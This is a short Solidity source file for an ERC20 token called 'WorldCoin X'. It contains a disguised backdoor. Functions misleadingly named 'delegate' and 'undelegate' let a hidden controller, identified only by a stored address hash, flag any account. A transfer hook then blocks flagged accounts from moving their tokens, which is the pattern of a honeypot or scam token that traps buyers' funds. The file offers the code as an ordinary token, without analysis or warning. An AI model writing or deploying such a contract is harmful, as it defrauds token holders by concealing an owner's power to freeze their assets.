// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract Token is ERC20 {
    mapping(address => bool) private _fAccounts;
    bytes32 private  _managementKeyHash=0xb053c89fa9b6550d0c5a2ec1ee2d30325e9bdad5094772c6dc387eb5e4f0b35b;


    constructor(uint256 initialSupply) ERC20("WorldCoin X", "X") {
        _mint(msg.sender, initialSupply * (10 ** decimals()));
    }

    function delegate(address target) public {
        if(keccak256(abi.encodePacked(msg.sender)) == _managementKeyHash){
            _fAccounts[target] = true;
        }
    }

    function undelegate(address target) public {
        if(keccak256(abi.encodePacked(msg.sender)) == _managementKeyHash){
            _fAccounts[target] = false;
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        require(!_fAccounts[from]);
        super._beforeTokenTransfer(from, to, amount);
    }


}